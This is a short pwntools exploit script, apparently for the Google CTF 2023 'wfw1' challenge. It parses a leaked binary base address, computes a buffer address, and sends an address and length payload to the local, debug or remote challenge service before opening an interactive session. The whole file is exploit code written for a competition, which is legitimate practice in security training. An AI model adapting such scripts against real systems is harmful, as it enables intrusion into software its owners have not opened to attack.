#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chal_patched_stdout"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("wfw1.2023.ctfcompetition.com", 1337)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *main+504
        b *main+595
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

p.recvuntil("shot.\n")
bin_base = eval(b'0x' + p.recv(12))
elf.address = bin_base
log.info("bin base: " + hex(bin_base))

for i in range(7):
    p.recvline()

"""
libc_base = eval(b'0x' + p.recv(12))
libc.address = libc_base
log.info("libc base: " + hex(libc_base))
"""

msg_addr = bin_base + 0x21e0
payload = "{} {}".format(hex(msg_addr), 0x7e).encode()
p.sendlineafter("expire", payload)


p.interactive()
